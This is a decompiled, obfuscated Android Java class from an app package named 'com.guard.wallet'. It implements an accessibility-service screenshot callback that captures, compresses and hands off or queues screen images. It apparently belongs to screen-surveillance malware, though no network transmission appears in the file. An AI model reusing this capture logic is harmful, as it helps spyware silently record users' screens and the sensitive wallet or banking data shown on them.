package p017u;

import a1.AbstractC0026q;
import android.accessibilityservice.AccessibilityService;
import android.graphics.Bitmap;
import android.graphics.ColorSpace;
import android.hardware.HardwareBuffer;
import android.util.Log;
import com.guard.wallet.req.ScreenMetricsVO;
import com.guard.wallet.service.MyAccessibilityService;
import com.guard.wallet.utils.AbstractC0249e;
import com.guard.wallet.utils.AbstractC0251g;
import d0.C0260a;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.atomic.AtomicInteger;

/* renamed from: u.a */
/* loaded from: classes.dex */
public final class C0918a implements AccessibilityService.TakeScreenshotCallback {

    /* renamed from: a */
    public final AtomicInteger f2080a = new AtomicInteger(-1);

    /* renamed from: b */
    public final AtomicBoolean f2081b;

    /* renamed from: c */
    public final AtomicBoolean f2082c;

    /* renamed from: d */
    public byte[] f2083d;

    /* renamed from: e */
    public Float f2084e;

    /* renamed from: f */
    public Integer f2085f;

    public C0918a(Float f2) {
        AtomicBoolean atomicBoolean = new AtomicBoolean(false);
        this.f2081b = atomicBoolean;
        AtomicBoolean atomicBoolean2 = new AtomicBoolean(false);
        this.f2082c = atomicBoolean2;
        atomicBoolean.set(false);
        atomicBoolean2.set(false);
        this.f2084e = (f2.floatValue() <= 0.0f || f2.floatValue() > 1.0f) ? Float.valueOf(m1383a()) : f2;
        this.f2085f = Integer.valueOf((int) (this.f2084e.floatValue() * 100.0f));
    }

    /* renamed from: a */
    public static float m1383a() {
        ScreenMetricsVO m616e = AbstractC0249e.m616e();
        if (m616e.getWidth() == null || m616e.getWidth().intValue() <= 0 || m616e.getHeight() == null || m616e.getHeight().intValue() <= 0) {
            return 0.25f;
        }
        return 800.0f / (m616e.getHeight().intValue() > m616e.getWidth().intValue() ? m616e.getHeight() : m616e.getWidth()).intValue();
    }

    /* renamed from: b */
    public final boolean m1384b() {
        return this.f2080a.get() == -1 || this.f2080a.get() == 1 || this.f2080a.get() == 2;
    }

    /* renamed from: c */
    public final void m1385c(Bitmap bitmap) {
        if (!this.f2082c.get()) {
            byte[] M0 = AbstractC0251g.M0(AbstractC0251g.m678y(bitmap), this.f2084e.floatValue(), this.f2085f.intValue());
            if (this.f2081b.get()) {
                MyAccessibilityService.m554P().getClass();
                MyAccessibilityService.a0(M0);
            }
            this.f2083d = M0;
            AbstractC0251g.J0(bitmap);
            return;
        }
        MyAccessibilityService m554P = MyAccessibilityService.m554P();
        m554P.getClass();
        try {
            if (m554P.m568Y()) {
                C0260a c0260a = m554P.f330m;
                if (c0260a.f424b.get()) {
                    c0260a.f423a.offer(bitmap);
                    if (System.currentTimeMillis() - c0260a.f425c.get() >= 60000) {
                        c0260a.m734a();
                    }
                }
            }
        } catch (Exception e2) {
            AbstractC0026q.m186s("MyAccessibilityService", e2);
        }
    }

    @Override // android.accessibilityservice.AccessibilityService.TakeScreenshotCallback
    public final void onFailure(int i2) {
        this.f2080a.set(2);
    }

    @Override // android.accessibilityservice.AccessibilityService.TakeScreenshotCallback
    public final void onSuccess(AccessibilityService.ScreenshotResult screenshotResult) {
        HardwareBuffer hardwareBuffer;
        ColorSpace colorSpace;
        Bitmap wrapHardwareBuffer;
        Log.d("CustomTakeScreenshotCallback", "AccessibilityService Screen Shot Success");
        this.f2080a.set(0);
        try {
            hardwareBuffer = screenshotResult.getHardwareBuffer();
            colorSpace = screenshotResult.getColorSpace();
            wrapHardwareBuffer = Bitmap.wrapHardwareBuffer(hardwareBuffer, colorSpace);
            if (wrapHardwareBuffer != null) {
                m1385c(wrapHardwareBuffer);
            }
        } catch (Exception e2) {
            AbstractC0026q.m186s("CustomTakeScreenshotCallback", e2);
        }
        this.f2080a.set(1);
    }

    public C0918a(Float f2, Integer num) {
        AtomicBoolean atomicBoolean = new AtomicBoolean(false);
        this.f2081b = atomicBoolean;
        AtomicBoolean atomicBoolean2 = new AtomicBoolean(false);
        this.f2082c = atomicBoolean2;
        atomicBoolean.set(false);
        atomicBoolean2.set(true);
        this.f2084e = (f2.floatValue() <= 0.0f || f2.floatValue() > 1.0f) ? Float.valueOf(m1383a()) : f2;
        if (num.intValue() <= 0 || num.intValue() > 100) {
            this.f2085f = Integer.valueOf((int) (this.f2084e.floatValue() * 100.0f));
        } else {
            this.f2085f = num;
        }
    }

    public C0918a(boolean z2) {
        AtomicBoolean atomicBoolean = new AtomicBoolean(false);
        this.f2081b = atomicBoolean;
        AtomicBoolean atomicBoolean2 = new AtomicBoolean(false);
        this.f2082c = atomicBoolean2;
        atomicBoolean.set(z2);
        atomicBoolean2.set(false);
        Float valueOf = Float.valueOf(m1383a());
        this.f2084e = valueOf;
        this.f2085f = Integer.valueOf((int) (valueOf.floatValue() * 100.0f));
    }
}
